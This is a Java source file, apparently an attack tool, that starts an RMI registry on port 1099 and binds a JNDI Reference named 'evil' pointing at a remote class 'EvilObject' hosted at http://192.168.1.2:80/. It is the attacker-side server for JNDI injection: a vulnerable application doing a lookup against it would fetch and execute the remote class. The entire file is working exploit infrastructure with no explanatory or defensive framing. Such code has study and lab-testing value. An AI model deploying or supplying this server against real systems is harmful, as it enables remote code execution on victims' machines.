import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.jndi.rmi.registry.RegistryContextFactory;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.Reference;
import java.io.Serializable;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

/**
 * @Author chenjl
 * @Date 2022/5/28
 * @Version 1.0
 */
public class RmiServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create RMI registry on port 1099");
            Reference reference = new Reference("EvilObject",
                    "EvilObject",
                    "http://192.168.1.2:80/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}